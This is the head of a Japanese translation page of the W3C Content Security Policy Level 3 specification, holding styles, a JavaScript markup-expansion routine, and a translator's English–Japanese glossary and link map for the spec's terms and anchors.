<!DOCTYPE html><html lang="ja"><head><meta charset="utf-8">
<title>Content Security Policy Level 3</title>

<link rel="stylesheet" href="common.css" type="text/css" />
<link rel="stylesheet" href="common-w3c.css" type="text/css" />
<style>
.wip { /* work in progress */
	background: #FCFAEE;
}

.report {
	color: green;
}

.scheme {
	color: #006633;
}

.abstract {
	color: green;
}

samp {
	white-space: nowrap;
	background: #F0F0F0;
	margin-left: 0.5em;
	margin-right: 0.5em;
}

pre.http-code {
	background: #EEE;
}
pre.html-code {
	background: #FFE;
}

.idl-def > dt {
	font-family: monospace0, monospace;
}

i {
	color: purple;
}

</style>


<script src="common0.js" ></script>
<script src="common1.js" async></script>

<script >
Util.ready = function(){
	const source_data = {
		toc_main: 'MAIN0',
		generate: expand
	};
	Util.switchWordsInit(source_data);
}

function expand(){
	const class_map = this.class_map;
	const tag_map = this.tag_map;
	const link_map = this.link_map;

	let idl_context = '';

	return this.html.replace(
		/%[\w\-~一-鿆あ-ん]+|`(.*?)([$@^])(\w*)/g,
		create_html
	);

	function create_html(match, key, indicator, klass){

if(!indicator) {//%
	return '<var>' + match.slice(1) + '</var>';
}


let text = key;
let href = '';
let classname = class_map[klass];
let tag = tag_map[klass];

switch(klass){
case 'r': // 文献
	text = '[' + key + ']';
	href = '#biblio-' + key.toLowerCase();
	break;
case 'pl': //protocol literal
	text = '\'' + key + '\'';
	href = '#grammardef-' + key;
	break;
case 'p': // protocol 要素
	href = '#grammardef-' + key;
	break;
case 'dir': // 指令
	href = '#' + key;
	break;
case 'sc': // scheme
	text = key.replace(/_/, ':' );
	break;
case 'hex': // hex 
	text = '%x' + key;
	break;
case 'I': // idl def
	if( indicator === '@') {
		idl_context = '#dom-' + key + '-';
	}
	break;
case 'm': // idl member
	href = href || (idl_context + key).toLowerCase();
	break;
case 'l': //literal
	text = '"<code class="literal">' + key +'</code>"'
	break;
case 'lt': //protocol literal
	text = '"<code class="literal">' + text + '</code>"';
	break;
case 'Issue':
	return '<a href="~CSP3issues/' + key + '">&lt;~CSP3issues/' + key + '&gt;</a>';
	break;
case 'IssW3C':
	return '<a href="https://github.com/w3c/html/issues/' + key + '">&lt;https://github.com/w3c/html/issues/' + key + '&gt;</a>';
	break;
case 'en': // english words
	return '<span lang="en-x-a0">' + key + '</span>'
	break;

case 'P': // protocol 要素
case 'd': // idl dict member
case 'sec': //節
case 'u': // 
case 'url': // 
case 'et': // 
case 'i': // 定数
case 'h': // HTTP header
case 'rq': // 要請
case 'rs': // 応答
case 'x': // plain
case 'vr': // 違反報告
case 'e': // HTML 要素
case 's': //samp
case 'c': //code
case 'v': // variables
case 'a': // HTML 内容属性
default:
	break;
}

if(tag) {
	text = '<' + tag +
		(classname ? ' class="' + classname + '">' : '>') +
		text + '</' + tag + '>';
}

if(indicator !== '^'){
	href = link_map[klass ? (klass + '.' + key) : key] || href;
	if(!href){
		console.log(match); // check error
		return match;
	}

	switch(indicator){
	case '$':
		text = '<a href="' + href + '">' + text + '</a>';
		break;
	case '@':
		text = '<dfn id="' + href.slice(1) + '">' + text + '</dfn>';
		break;
	}
}

return text;

	}
}
</script>


<script type="text/plain" id="_source_data">


●●options

spec_title:Content Security Policy Level 3
spec_date:2018-07-10
trans_update:2018-07-11
source_checked:180308
page_state_key:WEBAPPSEC
original_url:https://w3c.github.io/webappsec-csp/
spec_status:ED
ref_id_prefix:biblio-
ref_id_lowercase:true
conformance:w3c
copyright:2018,use
trans_1st_pub:2015-12-12

●●class_map
p:production
P:production
dir:directive
h:header
e:element
a:attr
et:event-type
I:idl
m:idl
jA:abstract
E:error
sc:scheme
at:css
f:css
pl:literal

●●tag_map
p:var
P:code
dir:code
h:code
css:code
sc:code
e:code
a:code
et:code
I:code
m:code
jA:span
E:code
at:code
f:code
c:code
s:samp
i:i
pl:code
NOTE:span

●●words_table



	●network/HTTP/fetch
navigate::::ナビゲート
netowrk::::ネットワーク
HTTP-network:
HTTP:
Fetch:
URL:
	IP
IPv6:
keepalive:
manifest::::マニフェスト
protocol::::プロトコル
url::::
id:
fetch::::
	~fetch~~処理:fetching
prefetch:
prerender:
port::::ポート
site::::サイト
website::::サイト
server::::サーバ
serve::::サーブ
path::::パス
scheme::::スキーム
局所:local::~::ローカル
redirect::::リダイレクト
	~redirect前の:pre-redirects
回数:count:~
	~redirect回数~redirect~count
referrer::::リファラ
client::::クライアント
address::::アドレス
国際化:internationalized:~
domain::::ドメイン
下位domain:subdomain:::下位ドメイン
field::::フィールド
header::::ヘッダ
host::::ホスト
hostname::::ホスト名
main:
message::::メッセージ
method::::メソッド
network::::ネットワーク
status::::ステータス
error::::エラー
web::::ウェブ
伝送-:transmit::~
受信-:receive::~
層:layer::~::レイヤ
接続-:connect::~::コネクト
接続:connection::~::コネクション
所在:location::~
応答:response::~::レスポンス
要請:request::~::リクエスト
要請前:pre-request::~::リクエスト前
要請後:post-request::~::リクエスト後
解決-:resolve:~
資格証:credentials::資格証明情報::クレデンシャル
起動元:initiator::~
起動-:initiate::~
資源:resource::~:リソース
下位資源:subresource::~:下位リソース
送信-:send::~
送信:sending::~
送達-:deliver::~
送達:delivery::~
達-:reach:~
通知-:notify::~
通知:notification::~
配備-:deploy::~::デプロイ
配備:deployment::~::デプロイメント
配置-:place:~
状態:state:~
生成元:origin::~::オリジン
非同一生成元:cross-origin::~::クロスオリジン
不透明な:opaque:~
本体:body::~::ボディ
素片:fragment::~
行先:destination::~
凍結:frozen::~
外向けの:outgoing:~
提出:submission::~

	●保安
XSS:cross-site scripting:XSS
dangling-markup:dangling markup:::マークアップぶら下げ
privacy::::プライバシー
保安:security::~:セキュリティ
保安的:secure::~:セキュア
	保安~上の:security
	保安~施策:security policy
非保安的:insecure::~:非セキュア
	保安的でない:insecure:~
保護-:protect:~
信用-:trust:~
安全:safe:~
非安全:unsafe:~
攻撃:attack:~
攻撃者:attacker:~
攻撃手法:attack vectors:~
敵対的:hostile:~
注入:injection:~
注入-:inject:~
暗号的:cryptographic::~
暗号用:cryptographic::~
脅威:threat:~
迂回-:bypass:~
迂回:bypass:~
軽減-:mitigate:~
防止-:prevent:~
中止-:abort:~
予測-:predict:~
悪用-:exploit:~
推測-:guess:~
	推測-不能:unguessable
欠陥:flaw:~
	exfiltration:::
sink:
双方向通信channel:bidirectional communication channel:双方向通信 channel::双方向通信チャネル
監禁-:lock down:~
投入-:feed:~
	fed
検証0-:verify:検証
検証:validation:~
乱数生成器:random number generator:~
脆弱性:vulnerabilities:~
網羅する:exhaustive な:~
	壊れ易く, 扱い難い:brittle, awkward
自信:confidence:~
	自信がない:low confidence
	自信がある:high degree of confidence
大変:tough:~
sniffing:
	持ち込む:bring する
	構文解析-時に挿入され:parser-inserted
完全性:integrity::~
特権:privilege:~
懸念-:concern:~

防御-:defend:~
緩い:lax な:~
騙せる:trick できる:~
漏洩:leakage:~
漏洩-:leak:~
探査-:probe:~

全部的:full:~
敏感:sensitive::~
session::::セッション
識別子:identifier:~
log-in::::ログイン
盗用-:steal:~
盗用:stealing:~
転用-:repurpose:~
	Pixel Perfect
	誘う道:tempting avenues
	UI Redressing
総当たり:brute force:~
打破-:subvert:~
悪意的な:malicious:悪意のある

	●CSP 対象
CSS:
	CSSOM
MIME:
compilation::::コンパイル
compile::::コンパイル
text::::テキスト
track::::トラック
inline::::インライン
navi:navigation:::ナビ
script::::スクリプト
style::::スタイル
stylesheet::::スタイルシート
sandbox::::サンドボックス
	~sandbox化:sandboxed
	~sandbox法:sandboxing
top-level::::トップレベル
pop-up:pop-up
plugin::::プラグイン
bookmarklet::::ブックマークレット
iframe-srcdoc:iframe srcdoc
onener:
realm:
環境:environment:~
音声:audio::~
動画:video::~
画像:image::~
宣言-:declare::~
宣言:declaration::~
規則:rule::~
選択子:selector::~::セレクタ
閲覧文脈:browsing context::~
作動中の:active な::~::アクティブな
	作動中:active:~
要素:element::~
文書:document::~
親:parent::~
先祖:ancestor::~
入子に:nest::入れ子に
入子の:nested::入れ子の
埋込んで:embed して::埋め込んで
埋込んだ:embed した::埋め込んだ
埋込む:embed する::埋め込む
埋込まれ:embed され::埋め込まれ
埋込める:embed できる::埋め込める
埋込み:embedding::埋め込み
	埋込-:embed:~
	読込-:load:~
読込み:loading::読み込み::ローディング
読込ませ:load させ::読み込ませ::ロードさせ
読込まれ:load され::読み込まれ::ロードされ
読込む:load する::読み込む::ロードする
読込める:load できる::読み込める::ロードできる
読込んで:load して::読み込んで::ロードして
読込んだ:load した::読み込んだ::ロードした
読込もう:load しよう::読み込もう::ロードしよう
誘発-:trigger:~
能力:capabilities:~
開いた:open した::~
開く:open する::~
開かれ:open され::~
開けな:open できな::~

	●CSP
CSP:
	Content Security Policy
hash::::ハッシュ
nonce::::ナンス
	~nonce可能:nonceable
	~nonce可能でない:not nonceable
metadata::::メタデータ
source::::ソース
fall-back:fall back:::フォールバック
fallback::::フォールバック
digest::::ダイジェスト

施策:policy::~:ポリシー
式:expression::~
報告:report::~
報告先:reporting endpoint::~
報告-:report::~
	報告-法:reporting
	報告-:reporting
端点:endpoint::~::エンドポイント
施行-:enforce::~
施行:enforcement::~
	施行ing:enforcing:施行
監視-:monitor::~
監視:monitoring::~
検査:check::~::チェック

制御:control:~
制約-:restrict:~
制約:restriction:~
制限-:limit:~
被保護:protected:~
	被設定時:被 set 時:~
合格-:pass::~::パス

阻止-:block::~::ブロック
	阻止する:block する::阻む::ブロックする
	阻止され:block され::阻まれ::ブロックされ
	阻止でき:block でき::阻め::ブロックでき
阻止ed:Blocked::阻止される::ブロックされる
	阻止:blocking::~::ブロッキング


合致-:match::~::マッチ
非合致:Does Not Match::合致しない::マッチしない
合致es:Matches::合致する::マッチする
照合:matching::~::マッチング
照合-:match::~::マッチ

許容-:allow:~
許容ed:Allowed::許容される
許容s:Allows::許容する
非許容:Does Not Allow::許容しない

違反-:violate::~
違反:violation::~
違反ed:violated::違反
非違反:Does Not Violate::違反しない

先天的:a priori:~

指令:directive::~::ディレクティブ
発火-:fire::~
	発行-:make:~
大域:global::~::グローバル
稼働中の:running:~
処理命令:processing-instruction:~
通過制御-:gate:~

状態code:status code::状態°code:状態°コード:ステータスコード
有効な:effective::~
処置先:disposition::~
行番号:line number::~
列番号:column number::~
見本:sample::~::サンプル

	●event／DOM／IDL
JS:JavaScript
IDL:
call:
callable:
target::::ターゲット
	再~target法:retargeting
event::::イベント
handler::::ハンドラ
listener::::リスナ
instance::::インスタンス
task::::タスク
	instance化:instantiation
	instance化:instantiate:~
interface::::インタフェース
obj:object:::オブジェクト
window:
worker:
専用:dedicated:~
所有者:owner::~
prop:property:::プロパティ
node::::ノード
shadow:
light:
	light:main
配送-:dispatch::~
木:tree::~::ツリー
根:root::~::ルート
投出-:throw:~
浮上-:bubble::~


	●構文
Unicode:
ASCII:
byte::::バイト
	ASTERISK
	SEMICOLON
	SOLIDUS
	FULLSTOP
	COMMA
	STOP
scheme-part:
space::::スペース
keyword::::キーワード
literal::::リテラル
構成子:constructs:~
構文:syntax:~
構文解析-:parse::~::パース
構文解析:parsing::~::パース処理
構文解析器:parser::~::パーサ
生成規則:production:~
同型:isomorphic::~
復号-:decode::~::デコード
符号化-:encode::~::エンコード
符号化法:encoding::~::エンコーディング
	符号化-法:encoding
文字:character:~
文字列:string:~
大小無視:case-insensitive:~
小文字:lowercase:~
文法:grammar:~
直列化:serialization::~::シリアル化
直列化-:serialize::~::シリアル化
直列形の:serialized::~::シリアル形の
直列形:serialized::~::シリアル形

符号位置:code point:~
空白:whitespace:~
space::空白
区切りの:-delimited:~
区切って:delimit して:~
asterisk::::アスタリスク
semicolon::::セミコロン
slash::::スラッシュ
period::::ピリオド
comma::::カンマ
token::::トークン
	~token化:tokenization

schedule::::スケジュール
妥当な:valid:~
妥当:valid:~

	●仕様
API:
algo:algorithm:::アルゴリズム
	W3C
bug::::バグ
noise::::ノイズ
UA:user agent:UA
model::::モデル
risk::::リスク
tool::::ツール
thread::::スレッド
UI::::
相互作用:interactions:~
不可欠:critical:~
公式的:formal:~
基盤:infrastructure:~
module::::モジュール
modular::::モジュール式
vendor::::ベンダ
version::::バージョン
技術的には:technical には:形の上では
適切:appropriate:~
一般:general:~
一般的:general:~
仕方:way:~
仕様:spec:~
仕組み:mechanism:~
任意の:arbitrary:~
側面:aspect:~
判定基準:criteria:~
実際:actual:~
実際の:actual:~
将来:future:~
序論:introduction:~
強力:powerful:~
	力:power:~
互換性:compatibility:~
後方互換性:backwards-compatibility:~
後方互換:backwards compatible:~
恒久的:permanent:~
情報:information:~
意味論的:semantic:~
手続き:steps:~
明示的:explicit:~
暗黙的:implicit:~
最善:best:~
実質的:effective:~
有意:significant:~
有用:useful:~
段:step:~
正確:exact:~
本当に:really:~
概観:overview:~
標準:standard:~
機能性:functionality:~
特定の:specific:~
特有の:-specific:~
特色機能:feature:~
枠組み:framework:~:::フレームワーク
理由:reason:~
用法:usage:~
用語:term:~
目標:goal:~
相応しい:suitable な:~
等価:equivalent:~
規範的:normative:~
規約:convention:~
詳細:details:~
詳細に:in detail に:~
詳細な:detailed:~
app:application:::アプリ
需要:demand:~
著作上の:authoring:~
優先権:priority:~
	優先権を与える:advance the user’s priority
中核:core:~
反復的に:iterative fashion で:~
単純:simple:~
	単に:simply
特質:properties:~
疑義:suspect:~
補佐的な:ancillary:~
勧める:suggest する:~
概念:concept:~
適度:reasonable:~
	策定-:land:~
状況:situations:~
旧来の:legacy:~
視野:scope:~
注意深い:careful な:~
注意深く:careful に:~
厳格:strict:~
適正:proper:~
不適正:improper:~
高価:expensive:~
手段:means:~
	可能:possible
困難:difficult:~
能:ability:~
自明:trivial:~
可視:visible:~
解釈-:interpret:~
相違:difference:~
基礎的な:foundational:~
注釈文:prose:~
可用:available:~
複雑さ:complexity:~
妥協点:compromise:~
代替-:alternate:~
提案:proposal:~
視点:perspective:~
現代の:modern:~
利点:advantage:~

	例:example:~
	課題:issue:::
	fashion:
	~~公開の問い:open questions
	理にかなうreasonably:
	意義:sense
	強くstrongly:
	節:section:~
	討論:discussion:~
	謝辞:acknowledgement:~
	類似する:similar:~
	類似的:similar:~
	相応に:fairly:
	調節-:tweak:
	正当:legitimate:~
	正当:right:~
	上手い:clever な:~

	好都合:is fine, and desirable
	主な:major
	概ね:roughly
	~~詳細は、~~自動的に:automagically
	明らかでない:not clear
	unclear
	substantial:::
	十分:sufficient:
	suspect
	〜に置き換えたもの~variant:
	その逆:vice-versa
	一方〜他方:vice-versa
	仕事~work:::
	好例:good examples
	広範:wide:~
	例えば:for instance
	短く言えば:In short
	上手く:well
	よって：:To that end
	それ自身のために／に利するために:behalf of に
	~~外:wild
	相当量:substantial amount
	相当に:pretty
	関わらず:regardless
	高次の:high-level
	更なる:further
	必要:need
	必要とされる:necessary
	同様に，:likewise
	様な／など:like
	今や:now
	今日:today
	何故なら:because
	ぶん，:fairly
	おかげ:helpfully
	-:is reasonable
	諸刃の剣:big hammer
	まとまりのない:sprawlings
	部位:portion
	繰り返し:iteration
	何らかの類の:some sort
	何らかの仕方で:in one way or another
	例えば，:for-example
	依然として:still
	良い:good
	おそらく:perhaps
	おそらく:probably
	あり得る／得る:potentially
	potential
	しかしながら:however
	awesome
	早期実装:earlier iteration

	●仕様（動詞
hook::::フック
support::::サポート
安定的:stable:~
形成-:form:~
選好-:prefer:~
概説-:outline:~
見なさ:consider さ:~
	取り扱う:deal with
波及-:influence:~
	has no influence
適合的:conformant:適合
適合性:conformance:~
適用-:apply:~
適用:application:~
避ける:avoid する:~
避けて:avoid して:~
避けれ:avoid でき:~
期待-:expect:~
期待:expectations:~
作者:author:~
依存-:depend:~
保持-:hold:~
利用者:user:~:::ユーザ
取止める:drop する:取り止める
	基づく:based:~
変更点:changes:~
変更-:change:~
外部:external:~
外部化-:externalize:~
奨励-:encourage:~
存在-:exist:~
定義-:define:~
定義:definition:~
実施:practice:~
実装-:implement:~
実装:implementation:~
意味-:mean:~
意味:meaning:~
意図的:intentional:~
意図-:intend:~
	~~意図:meant
拡張:extension:~
	拡張性:extensibility:~
拡張-:extend:~
指定-:specify:~
挙動する:behave する:ふるまう
挙動:behavior:ふるまい
明確さ:clarity:~
明確:clear:~
明確化-:clarify:~
発展:evolution:~
無傷で:unscathed:~
干渉-:interfere:~
非推奨に:deprecate:~
非推奨:deprecated:~
影響0:impact:影響
望む:wish する:~
欠く:lack する:~
求める:want する:~
決定-:determine:~
無視-:ignore:~
供-:provide:~
提供-:offer:~
改善:improvement:~
改善-:improve:~
実行-:execute:~
実行:execution:~
	-:perform
具現化-:render:~
目指す:aim する:~
目指して:aim して:~
確保-:ensure:~
	必ず
答え:answer:~
築く:build する:~
築ける:build できる:~
築上げる:build up する:築き上げる
実験-:experiment:~
結付けら:associate さ:結び付けら
統合-:integrate:~
統合:integration:~
統治-:govern:~
補助-:help:~
要件:requirements:~
要求-:require:~
	見出-:find:~
規制-:regulate:~
警告:warning:~
考慮点:consideration:~
調整-:adjust:~
論じら:discuss され:~
登記簿:registry:::レジストリ
登録:registration:~
登録-:register:~
開発者:developer:~
運用者:operator:~
依拠-:rely:~
関係:relation:~
関係する:related:~
	比してin relation to
駆動-:drive:~
含意-:imply:~
含意:implications:~
代用:replacement:~
信奉-:espouse:~
説明-:explain:~
手入力-:enter:~
尊守-:honor:~
先送り:defer:~
正す:correct する:~
正しく:correct に:~
包摂-:encompass:~
	包摂的:encompassing fashion
受容-:accept:~
設計:design:~
破棄-:discard:~
試みる:attempt する:~
試みた:attempt した:~
保守-:maintain:~
依存関係:dependencies:~
廃用に:obsolete:~
公開-:expose:~
care::::ケア
見積もり:estimate:~
計画-:plan:~
影響-:affect:~
述べた:describe した:~
述べる:describe する:~
述べら:describe さ:~
	述-:describe
拘束:constraints:~
裁定:decision:~
	裁定を下す:make decisions
精査-:examine:~

	利用:use:~
	生じることになる:in play
	勧める:it is advisable to
	同時に〜にもなる:balance
	~~述べられ:spell out
	書き記す:spell 〜 out
	ときに呈する〜 “面白い” :sometimes-interesting 〜 present
	興味を引く:interesting
	担当する:responsible
	まだ策定段階にある:work in progress
	走査してwalking:
	~~注視-:watching:
	~~正しく保つ:get right
	拡げ:expand
	反した:goes against
	価値が損われる:significantly reducing their value
	整える:set up
	従う-:adhere:~
	判断が付いた:gained confidence
	効果を~~発揮する:gains meaning
	土台:ground up
	いずれかに~~分類される:fall into one of several categories
	緩め:loosen
	書き直され:rewritten
	~~働くserve
	~~置き換えて~substituteして
	関わる:interesting
	あたられるべき:ought to be consulted:
	~~意図:meant
	できるだけ抑え:try to minimize
	呼び出し元:caller
	外からの入力に対する注意深い検証／出力の安全な形への符号化-:careful input validation and output encoding
	~~渡し~~返す:handing the response back to
	則って:according
	accordingly
	満たされ:met
	満たす:meet
	考-:think
	見よ:see
	preferably
	選ばれ:chosen
	出荷-:ship
	かなり改められた:substantially altered
	責を負う:responsible
	-:assuming
	織り込む:take into account

	●未分類（動詞
lock::::ロック
	popping:
push::::プッシュ
scalable::::スケーラブル
	skip::::
sort::::ソート
	splitting::::
剥いで:strip して:~
除外-:exclude:~
検出-:detect:~
不許可に:disallow:~
上書き:override:~
昇格:upgrade:~
文脈:context:~
抽出-:extract:~
拡充-:populate:~
抑制-:reduce:~
初期:initial:~
初期化-:initialize:~
	initializing:~
初期化:initialization:~
作成-:create:~
作成:creation:~
作成法:creating:~
動作-:act:~
動作:action:~
包含-:contain:~
収集-:collect:~
分割-:split:~
取得-:get:~
成功-:succeed:~
成功裡:successful:~
失敗-:fail:~
挿入-:insert:~
改変-:modify:~
	modification
格納-:store:~
構築-:construct:~
準備-:prepare:~
生成-:generate:~
除去-:remove:~
取扱い:handling:取り扱い
取扱う:handle する:取り扱う
取扱われ:handle され:取り扱われ
可能化-:enable:~
置換-:replace:~
置換:replacement:~
正規化-:normalize:~
表現-:represent:~
表現:representation:~
識別-:identify:~
評価-:evaluate:~
先行-:precede:~
完了-:complete:~
完全:complete:~
処理-:process:~
処理:processing:~
追加-:add:~
	追加の:additional:~
呼出:invocation:呼び出し
在する:present する:在る
	在しな:present しな:無
	在する下:presence
不在:absence:~
組合せ:combination:~
	残りの:remaining:~
	渡す:pass する:~
設定-:set:~
設定子:setter::~
設定群:settings::~
生産-:produce:~
	~~源になる:produce:~
走らす:run する:~
操作-:manipulate:~
継承:inheritance:~
継承-:inherit:~
有順序:ordered:~
付加-:append:~
	-:stem
取消され:cancel され:取り消され
queue::::キュー
記録-:record:~
複製:copy:~
snapshot::::スナップショット
未所有化:disowned::~
待機-:wait:~

	通り抜けて:way out
	始-:begin
	弱:weak
	得る:obtain
	手渡す:hand
	返-:return
	consist
	consisting
	count
	end
	fall
	gained
	get
	having
	叩く:hit
	見当たらない:looked
	moving
	put
	remain
	said
	seem
	を指している:pointing to
	重複:duplicate
	探し出-:looking for
	得る:Retrieve
	起こる:happen

	●未分類
ABNF:
HTML:
	Document
	JSON
	Level
	Main
	Service Worker
	XSLT
	base64

access::::アクセス
addon::::アドオン
bit::::ビット
code::::コード
block::::ブロック
browser::::ブラウザ
size::::サイズ
	abstract:
	case-sensitive:
束縛-:bind:~
flow::::フロー
	subject:::
厳密:strict:~
console::::コンソール
data::::データ
	decision:
	demonstrate::::
file::::ファイル
flag::::フラグ
font::::フォント
強制:forced::~
form::::フォーム
frame::::フレーム
group::::グループ
iframe::::
index::::
item::::アイテム
level::::レベル
list::::リスト
logic::::ロジック
mode::::モード
	open::::
	opener:
page::::ページ
pair::::ペア
	成分:part:~
parameter::::パラメタ
pipe:
percent-::: %-
	~plugin-type:
random::::ランダム
tag::::タグ
dashboard::::ダッシュボード
service::::サービス
escape::::エスケープ


抽象演算:abstract operation:~
担当の:responsible:~
値:value:~
出力:output:~
入力:input:~
内容:content:~
再利用-:reuse:~
	から生じて:originate:~
効果:effect:~
動的:dynamic:~
参照:reference:~
名前:name:~
名:name:~
型:type::~
種別:type::~
基底:base:~
属性:attribute:~
引数:argument:~
	数:number:~
整数:integer:~
新たな:new:~
既定:default:~
既定の:default:~
更新:update:~
条件:condition:~
運用:operation:~
直に:direct に:~
相対的:relative:~
相対:relative:~
関連する:relevant な:~
種類:kind:~
細かい:granular な:~
細かさ:granularity:~
	簡単:straightforward:~
空:empty:~
	複数の:multiple:~
	量:amount:~
集合:set:~
非負:non-negative:~
源:source:~
下層の:underlying:~
配備上の:deployment:~


	●
	抗-:against
	新たに:newly
	異なる:different
	長い:long
	note
	respective
	short
	time
	top
	true
	back
	e-mail:e-mail
	in order to
	informative
	people
	public
	ought
	please
	we
	-:over
	~source:payload

	●指示語
元の:original:~
	~~元の:main
現在の:current:~
	現在:currently
自前の:own:~
単独の:single:~
既存の:existing:~
特定0の:particular:ある特定の
	個々の:particular
一意な:unique:~
内側:inside:~
外側:outside:~
	全体:entire:~
	-／まるごと:entirely
	最初の:first:~
	~~最後の:final
	代わりに:instead
	別の:another
	次の:the following
	ある種の:certain
	ある種の:one variant
	その一片:that bit
	~~尾部の:rightmost
	自身:itself
	一部:part of
	両者:both
	各:each
	各種:various
	別個:distinct:~
	前者:former:~
	古い:old:~
	いくつかの:a number of
	この:this
	これらの:these
	すべての:all
	その:that
	それらの:those
	べき:should
	もっと良いbetter:
	より:more
	上:above
	所与の:given
	与:give
	二つの:two
	二番目の:second
	介:via
	他の:other
	他の場合:otherwise
	前:before
	同じ:same
	含-:include
	含めて:including
	多くの:many
	少数の:few
	後:after
	後者:latter
	結果:result
	結果の:resulting
	everything
	以上:least
	片:piece
	during
	anyone
	anything
	neither
	sequence
	一連の:series of
	several
	something
	後続して:subsequent
	such
	themselves
	thing
	together
	前面:front
	lot
	moreover
	nothing
	ここで:here
	-／次の:below
	すでに:already


●●original_id_map


ascii-case_insensitive:
style-src-init:


●●words_table1


REPORTING:reporting1-ja.html
	https://w3c.github.io/reporting/
	https://mikewest.github.io/error-reporting/
SRI1:webappsec-subresource-integrity-ja.html
UPGRADE-INSECURE-REQUESTS:webappsec-upgrade-insecure-requests-ja.html
CSP3issues:https://github.com/w3c/webappsec-csp/issues

ACI:<sub>大小無視</sub>

meta:<code class="element">meta</code> 
strict-dynamic-usage:<a href="#strict-dynamic-usage"><code class="literal">'strict-dynamic'</code> の用法</a>節

at_import:<code class="css">@import</code>


●●link_map


	●grammardef
	pl.none:#grammardef-none
	pl.self:#grammardef-self
	pl.unsafe-eval:#grammardef-unsafe-eval
	pl.strict-dynamic:#grammardef-strict-dynamic
	pl.unsafe-inline:#grammardef-unsafe-inline
	pl.unsafe-hashes:#grammardef-unsafe-hashes

	p.ancestor-source-list:#grammardef-ancestor-source-list
	p.ancestor-source:#grammardef-ancestor-source
	p.base64-value:#grammardef-base64-value
	p.directive-name:#grammardef-directive-name
	p.directive-value:#grammardef-directive-value
	p.hash-algorithm:#grammardef-hash-algorithm
	p.hash-source:#grammardef-hash-source
	p.host-char:#grammardef-host-char
	p.host-part:#grammardef-host-part
	p.host-source:#grammardef-host-source
	p.keyword-source:#grammardef-keyword-source
	p.media-type-list:#grammardef-media-type-list
	p.media-type:#grammardef-media-type
	p.nonce-source:#grammardef-nonce-source
	p.path-part:#grammardef-path-part
	p.port-part:#grammardef-port-part
	p.scheme-part:#grammardef-scheme-part
	p.scheme-source:#grammardef-scheme-source
	p.serialized-directive:#grammardef-serialized-directive
	p.serialized-policy:#grammardef-serialized-policy
	p.serialized-policy-list:#grammardef-serialized-policy-list
	p.serialized-source-list:#grammardef-serialized-source-list
	p.source-expression:#grammardef-source-expression

p.path-absolute:~IETF/rfc3986#section-3.3
p.scheme:~IETF/rfc3986#section-3.1
p.IPv4address:~IETF/rfc3986#section-3.2.2
p.uri-reference:~IETF/rfc3986#section-4.1
	~IETF/rfc5234#appendix-B.1
p.token:~RFC7230#section-3.2.6
	~IETF/rfc7230#section-3.2.3
p.type:~IETF/rfc2045#section-5.1
p.subtype:~IETF/rfc2045#section-5.1
p.base64url:~IETF/rfc4648#section-5
p.base64:~IETF/rfc4648#section-4

P.ALPHA:#_ALPHA
P.DIGIT:#_DIGIT
P.VCHAR:#_VCHAR
P.OWS:#_OWS
P.RWS:#_RWS

~asterisk:#_asterisk
~semicolon:#_semicolon
~slash:#_slash
~comma:#_comma

	●dom
I.SecurityPolicyViolationEventDisposition:#enumdef-securitypolicyviolationeventdisposition
I.SecurityPolicyViolationEventInit:#dictdef-securitypolicyviolationeventinit
I.SecurityPolicyViolationEvent:#securitypolicyviolationevent
I.ServiceWorker:~SW#serviceworker
I.SharedWorker:~WORKERS#sharedworker
I.Worker:~WORKERS#worker
I.WorkerGlobalScope:~WORKERS#workerglobalscope
I.WorkletGlobalScope:~WORKLETS1#workletglobalscope
I.Window:~WINDOW#window
I.WebSocket:~WEBSOCKET#websocket
I.EventSource:~HTMLsse#eventsource
I.XMLHttpRequest:~XHR#xmlhttprequest
I.DedicatedWorkerGlobalScope:~WORKERS#dedicatedworkerglobalscope
I.SharedWorkerGlobalScope:~WORKERS#sharedworkerglobalscope
I.ServiceWorkerGlobalScope:~SW#serviceworkerglobalscope

要素:~DOM4#concept-element
	I.Element:~DOM4#element
I.Event:~DOM4#event
I.EventInit:~DOM4#dictdef-eventinit
I.Document:~DOM4#document
文書:~DOM4#document

l.enforce:#dom-securitypolicyviolationeventdisposition-enforce
l.report:#dom-securitypolicyviolationeventdisposition-report

d.blockedURI:#dom-securitypolicyviolationeventinit-blockeduri
d.columnNumber:#dom-securitypolicyviolationeventinit-columnnumber
d.documentURI:#dom-securitypolicyviolationeventinit-documenturi
d.effectiveDirective:#dom-securitypolicyviolationeventinit-effectivedirective
d.lineNumber:#dom-securitypolicyviolationeventinit-linenumber
d.originalPolicy:#dom-securitypolicyviolationeventinit-originalpolicy
d.sourceFile:#dom-securitypolicyviolationeventinit-sourcefile
d.sample:#dom-securitypolicyviolationeventinit-sample
d.disposition:#dom-securitypolicyviolationeventinit-disposition
d.referrer:#dom-securitypolicyviolationeventinit-referrer
d.statusCode:#dom-securitypolicyviolationeventinit-statuscode
d.violatedDirective:#dom-securitypolicyviolationeventinit-violateddirective

m.Constructor:#dom-securitypolicyviolationevent-securitypolicyviolationevent
m.blockedURI:#dom-securitypolicyviolationevent-blockeduri
m.columnNumber:#dom-securitypolicyviolationevent-columnnumber
m.documentURI:#dom-securitypolicyviolationevent-documenturi
m.effectiveDirective:#dom-securitypolicyviolationevent-effectivedirective
m.lineNumber:#dom-securitypolicyviolationevent-linenumber
m.originalPolicy:#dom-securitypolicyviolationevent-originalpolicy
m.sourceFile:#dom-securitypolicyviolationevent-sourcefile
m.sample:#dom-securitypolicyviolationevent-sample
m.disposition:#dom-securitypolicyviolationevent-disposition
m.referrer:#dom-securitypolicyviolationevent-referrer
m.statusCode:#dom-securitypolicyviolationevent-statuscode
m.violatedDirective:#dom-securitypolicyviolationevent-violateddirective

	m.referrer:~HTMLdom#dom-document-referrer
m.bubbles:~DOM4#dom-event-bubbles
m.composed:~DOM4#dom-event-composed
m.target:~DOM4#dom-event-target
m.setInterval():~HTMLGAPI#dom-setinterval
m.setTimeout():~HTMLGAPI#dom-settimeout
m.document:~WINDOW#dom-window-document
m.fetch():~FETCH#fetch-method
m.ping:~HEtextlevel#dom-a-ping


	m.cssText
	m.insertRule()

	v.type:#dom-securitypolicyviolationevent-securitypolicyviolationevent-type-eventinitdict-type
	v.eventInitDict:#dom-securitypolicyviolationevent-securitypolicyviolationevent-type-eventinitdict-eventinitdict

et.securitypolicyviolation:#_event-type-securitypolicyviolation

	●dirctive
	dir.base-uri:#base-uri
	dir.child-src:#child-src
	dir.connect-src:#connect-src
	dir.default-src:#default-src
	dir.font-src:#font-src
	dir.form-action:#form-action
	dir.frame-ancestors:#frame-ancestors
	dir.img-src:#img-src
	dir.media-src:#media-src
	dir.object-src:#object-src
